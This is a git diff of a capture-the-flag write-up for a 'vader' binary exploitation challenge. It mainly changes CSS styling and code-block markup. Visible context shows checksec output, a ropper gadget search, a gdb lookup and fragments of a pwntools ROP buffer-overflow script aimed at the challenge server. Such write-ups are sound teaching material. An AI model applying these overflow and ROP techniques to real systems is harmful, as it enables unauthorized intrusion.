@@ -16,12 +16,14 @@ thumbnail: /asset/banner/banner-vader.png
 
 <style>
     .box {
-        border: 1px solid rgba(100, 100, 100, .5);
+        border: 1px solid rgb(23, 25, 27);
+        border-radius: 5px;
+        background-color: rgb(23, 25, 27);
         padding: 1rem;
         font-size: 90%;
         text-align: center;
-        margin-bottom: 1rem;
         margin-top: 1rem;
+        margin-bottom: 1rem;
     }
     .flex-container {
         display: flex;
@@ -36,14 +38,14 @@ Submit flag from <code>/flag.txt</code> from <code>0.cloud.chals.io:20712</code>
 <b>Files</b>: <a href="/asset/shctf/vader">vader</a>
 </div>
 
-```text
+{% codeblock checksec.sh lang:console "https://github.com/slimm609/checksec.sh" checksec.sh github %}
 [*] '/home/kali/ctfs/shctf/pwn/vader/vader'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x400000)
-```
+{% endcodeblock %}
 
 As with any binary-only challenge, the first thing we must do is boot it up in the **Ghidra** disassembler. Looking through the code we can check what our main function does:
 
@@ -143,7 +145,7 @@ Although you can use these, it's not really in the nature of a ROP challenge, so
 To find the gadgets we need, we will be utilizing a program called `ropper` and `grep`-ing the output:
 
 ```console
-root@kali~$ ropper -f vader | grep "rdi"
+$ ropper -f vader | grep "rdi"
 ```
 
 ```properties
@@ -181,14 +183,14 @@ The last thing we need to do is to find the hex addresses of our argument string
 
 Don't forget the address of `vader()` too!:
 
-```console
+{% codeblock gdb-gef "x" command "https://visualgdb.com/gdbreference/commands/x" command documentation %}
 gef➤  x vader
 0x40146b <vader>: 0xe5894855
-```
+{% endcodeblock %}
 
 Here is my final script, which defines a variable for each section of our gigantic payload -- this is for enhanced readability. I've also used the `p64()` function, which converts the address into little endian:
 
-```py
+{% codeblock vader.py lang:py "https://gist.github.com/jktrn/a499cfd248125a9d57924f8f602fda30" github gist link %}
 from pwn import *
 
 offset =        b'A'*40         # OVERFLOWING 32 + 8 BYTES FOR $RBP
@@ -218,7 +220,7 @@ p = remote("0.cloud.chals.io", 20712)
 p.sendline(payload)
 log.success(p.recvallS())
 p.close()
-```
+{% endcodeblock %}
 
 I don't usually do this, but here's a clip of me initially solving the challenge by running the above script:
 
